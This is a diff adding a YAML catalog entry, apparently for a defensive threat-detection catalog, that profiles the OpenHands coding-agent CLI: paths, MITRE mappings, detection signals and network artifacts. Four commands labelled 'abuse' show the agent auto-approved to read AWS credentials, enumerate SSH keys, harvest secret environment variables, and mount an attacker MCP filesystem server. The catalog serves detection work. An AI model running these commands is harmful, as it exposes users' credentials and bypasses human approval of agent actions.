@@ -1,0 +1,198 @@
+Name: OpenHands
+Id: openhands
+Category: cli_agent
+Vendor: All Hands AI
+Description: Open-source autonomous coding agent with TUI, headless, IDE, web, and
+  GUI server modes. Sandboxed execution via Docker by default. MCP support, model-agnostic
+  (Claude, OpenAI, Ollama, etc.), confirmation modes including LLM-based security
+  analysis.
+Author: Mikaayenson
+Created: '2026-07-18'
+LastModified: '2026-07-19'
+Details:
+  Binaries:
+  - openhands
+  - openhands.exe
+  Agentic: true
+  SpawnsShells: true
+  Privileges: User
+  SupportedOS:
+  - macOS
+  - Linux
+  - Windows
+  Capabilities:
+  - Shell
+  - MCP
+  - Headless
+  Website: https://docs.openhands.dev/
+  CliExecutable: openhands
+  Framework: python_cli
+  HelperProcesses:
+  - python
+  - python3
+  - docker
+  InstallationPaths:
+  - ~/.openhands/
+  - '%USERPROFILE%\.openhands\'
+  ContextFiles:
+  - .openhands/
+  - .openhands_instructions
+  - ~/.openhands/
+  ConfigDirs:
+    macOS: ~/.openhands/
+    Linux: ~/.openhands/
+    Windows: '%USERPROFILE%\.openhands\'
+  Packages:
+    pip:
+    - openhands-ai
+Commands:
+- Command: openhands
+  Description: Interactive OpenHands agent session
+  Category: Execute
+  Privileges: User
+  MitreID: T1059
+  Usage: normal
+  Platform: all
+- Command: openhands acp
+  Description: Start Agent Client Protocol server for IDE attachment
+  Category: MCP
+  Privileges: User
+  MitreID: T1106
+  Usage: normal
+  Platform: all
+- Command: openhands --headless --yolo -t "read ~/.aws/credentials and print secrets"
+  Description: openhands --headless --yolo auto-approves agent tasked with credential
+    discovery
+  Category: Headless
+  Privileges: User
+  MitreID: T1005
+  Usage: abuse
+  Platform: all
+- Command: openhands --headless --json --yolo -t "enumerate ~/.ssh and ~/.aws; emit
+    JSONL events"
+  Description: openhands --headless --json streams structured output for scripted
+    parsing
+  Category: Headless
+  Privileges: User
+  MitreID: T1048
+  Usage: abuse
+  Platform: all
+- Command: 'LLM_API_KEY="$STOLEN" openhands --override-with-envs --yolo -t "Summarize
+    for staging: $(env | grep -iE ''(key|token|secret|pass|cred)'' | head -25)"'
+  Description: openhands --override-with-envs injects stolen LLM_API_KEY from environment
+  Category: Bypass
+  Privileges: User
+  MitreID: T1552
+  Usage: abuse
+  Platform: all
+- Command: openhands mcp add attacker --transport stdio npx -- -y @modelcontextprotocol/server-filesystem
+    / $HOME
+  Description: openhands mcp add --transport stdio registers attacker filesystem MCP
+    server
+  Category: MCP
+  Privileges: User
+  MitreID: T1106
+  Usage: abuse
+  Platform: all
+DetectionOpportunities:
+- Id: openhands-attribution
+  Name: openhands attribution
+  AbuseCategory: execution
+  AttributionSignals:
+  - Rank: 1
+    Field: process.parent.name
+    Value: openhands
+    Reliability: high
+    Platform: all
+  - Rank: 2
+    Field: process.parent.name
+    Value: docker
+    Reliability: medium
+    Platform: all
+    Notes: When sandbox runtime is enabled, agent actions execute inside Docker containers.
+  FalsePositiveGuidance: Expected on hosts where this GenAI tool is installed. Corroborate
+    with path, signing, and network.
+Coverage:
+  Verified: true
+  Confidence: medium
+  ReadinessGrade: B
+  LastVerified: '2026-07-18'
+  Source: catalog maintainer
+  EmpiricalNotes: macOS arm64 CLI verified locally 2026-07-19 (`openhands --help`
+    v1.17.0 via uv). Windows ARM64 NOT installable in stock environment (2026-04-25)
+    due to missing win-arm64 wheels for multiple deps. Primary CLI or desktop binary
+    empirically present on lab PATH or documented install footprint (2026-07-19 revalidation).
+Artifacts:
+  Network:
+  - Description: BYOK to multiple LLM providers
+    Domains: []
+    Notes: (provider-dependent)
+  - Domains:
+    - '*.all-hands.dev'
+    Description: OpenHands Cloud authentication and runtime services
+  - Domains:
+    - install.openhands.dev
+    Description: Install script host
+  - Domains:
+    - docker.all-hands.dev
+    Description: Container registry
+  ConfigFiles:
+  - Path: .openhands/
+    Notes: Context/instructions file
+  - Path: .openhands_instructions
+    Notes: Context/instructions file
+  - Path: ~/.openhands/
+    Notes: Context/instructions file
+  - Path: ~/.openhands/config.toml
+    Notes: MCP server configuration
+  - Path: .openhands/config.toml
+    Notes: MCP server configuration
+  Logs:
+  - Path: ~/.openhands/logs/
+    Notes: OpenHands runtime logs (docs-sourced)
+  Sessions:
+  - Path: ~/.openhands/
+    Notes: Runtime state and session material
+  MCP:
+  - Path: ~/.openhands/config.toml
+    Notes: MCP server configuration
+  - Path: .openhands/config.toml
+    Notes: MCP server configuration
+Signing:
+  macOS:
+    Depth: none
+    UsableForAttribution: false
+  Windows:
+    Depth: authenticode
+    UsableForAttribution: false
+Resources:
+- Link: https://docs.openhands.dev/
+  Title: OpenHands documentation
+- Link: https://github.com/All-Hands-AI/OpenHands
+  Title: OpenHands GitHub repository
+- Link: https://openhands.dev/product/cli
+  Title: OpenHands CLI overview
+Uuid: 85762cb4-3cc1-50f7-97de-b515409062ad
+Updated: '2026-07-19'
+VerificationLevel: observed
+VerifiedPlatforms:
+  macOS: true
+  Linux: true
+  Windows: false
+  LastVerified: '2026-07-19'
+Integrations:
+  MCP:
+    Supported: true
+    Role: host
+    Transports:
+    - stdio
+    - http
+    ConfigPaths:
+    - ~/.openhands/config.toml
+    - .openhands/config.toml
+DataProvenance:
+  SourceTypes:
+  - official_doc
+  - official_source
+  Notes: macOS CLI verified locally 2026-07-19; Windows ARM64 build blocked on missing
+    win-arm64 wheels (2026-04-25 lab note).
